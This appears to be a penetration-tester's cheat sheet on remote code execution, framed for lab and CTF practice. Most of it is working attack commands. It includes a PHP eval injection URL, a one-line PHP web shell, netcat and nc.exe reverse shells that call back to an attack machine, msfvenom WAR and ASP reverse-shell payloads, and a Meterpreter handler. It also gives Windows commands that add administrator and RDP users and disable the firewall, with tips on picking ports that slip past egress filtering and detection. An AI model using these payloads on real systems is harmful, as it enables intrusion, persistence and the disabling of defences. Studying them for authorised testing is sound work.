# Remote code execution

Remote code execution \(RCE\), also known as code injection, refers to an attacker executing commands on a system from a remote machine. Often this means exploiting a web application/server to run commands for the underlying operating system.

## Basic technique

The following php snippet will take the `GET` parameter `code` and run it through the `eval()` function without any input sanitization:

```text
<?php $code = $_GET['code'];
eval($code); ?>
```

The `eval()` function evaluates the contents as php code, which means we can provide any php code as an argument. The code injection would look like this:

```text
http://[host]/page.php?code=phpinfo();
```

## Remote command execution

You might also be able to execute single-line system commands like `system('id');`. For multi-line system commands, use `shell_exec`:

```text
http://[host]/page.php?code=echo shell_exec('/sbin/ifconfig eth0');
```

This method is useful for both system enumeration and shell injection. Make sure to use absolute paths for calling system files, or the web application may not find them.

## Shells
For most lab or CTF environments, the goal is to get some kind of command shell on the machine for further exploitation. Sometimes this simply means discovering SSH or remote desktop credentials and logging in. Other times, it's exploiting a web application to generate a reverse shell that connects to your attack machine and waits for instructions.

In real life I'm not sure how often reverse shells really happen, but they're fun to pull off in the lab.

If shells are a new concept, [this is a good primer](https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/).

## Listeners
Your attack machine needs to have a listener running to catch a reverse shell connection. Make sure you specify the IP address of your attack machine and use a port that doesn't already have a service listening. If you need to use `python SimpleHTTPServer` or similar to transfer exploits, make sure that isn't running on the same port. 

### Netcat listener
Using ports 80 or 443 will help you get around egress filtering:
```
nc -lvp 443
```
### Meterpreter listener
You may prefer a Meterpreter listener if you're connecting to a Windows machine and want to take advantage of commands like `getsystem`, or you want to use local Metasploit exploits once you've connected to the remote machine.

Avoid using port 4444 since that is widely recognized as a Metasploit port:
```
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp # or whatever
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost [attack machine] # your IP address
lhost => [attack machine]
msf exploit(handler) > set lport 443
lport => 443
msf exploit(handler) > run
```

## Simple PHP web shell
Assuming you are able to put a file on the web server or edit an existing one (e.g. CMS template) this is the simplest type of shell:

```
<?php echo shell_exec($_GET['cmd']); ?>
```
You can use it for system commands: 
```
http://[host]/wordpress/index.php?cmd=id
```
You can also use it to create a reverse shell:
```
http://[host]/wordpress/?cmd=nc [attack machine] [port] -e /bin/sh
```
## PHP shell
This [PHP web shell from pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) is nice. Make sure to change the following variables before uploading:
```
$ip = '127.0.0.1';  # change to attack machine IP
$port = 1234;       # change to attack machine port
```
## Perl shell
I've never tried [a Perl shell](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell) because I've never encountered a Perl web server, but it's probably okay. 

As with the PHP shell, change the following variables:
```
my $ip = '127.0.0.1';
my $port = 1234;
```

## WAR shell
If you're able to access a Tomcat server's management interface, you can generate and upload a WAR file:
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[attack machine] LPORT=443 -f war > shell.war
```
You can fire the shell by clicking on the link in Tomcat's management interface, or by going to the appropriate URL (e.g. `http://[host]/shell/`)

## Windows
Windows is a little weird. If you encounter an IIS server, you can use msfvenom to create an `.asp` or `.aspx` payload:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[attack machine] LPORT=443 -f asp > shell.asp
```
You can also attempt to download `nc.exe`, then run: 
```
nc.exe -e cmd.exe [attack machine] [port]
```
If RDP is enabled (port 3389), you might be able to create a user and add them to the “Remote Desktop Users” group, then log in via remote desktop.

Add a user on windows:
```
net user $username $password /add
```
Add a user to the “Remote Desktop Users” group:
```
net localgroup "Remote Desktop Users" $username /add
```
Make a user an administrator:
```
net localgroup administrators $username /add
```
Disable Windows firewall on newer versions:
```
NetSh Advfirewall set allprofiles state off
```
Disable windows firewall on older windows:
```
netsh firewall set opmode disable
```
## Upgrading shell
You will use this line pretty often to fix your shells:
```
python -c 'import pty; pty.spawn("/bin/bash");'
```
To improve the shell further, use `Ctrl + Z` to background the reverse shell, then in your local machine run:
```
stty raw -echo
fg
```
Things are going to look really messed up at this point, just type `reset` and hit `Enter`. This should provide you with a fully interactive reverse shell.

If the shell dimensions are wrong, background the reverse shell again with `Ctrl + Z`, go to your local machine and run:
```
stty size
```
This should return two numbers, which are the number of rows and columns in your terminal. Assuming these numbers are `48 120`, return to your victim machine’s shell and run:
```
stty -rows 48 -columns 120
```
## Further reading
* [Reverse shell cheat sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [Creating Metasploit payloads](https://netsec.ws/?p=331)
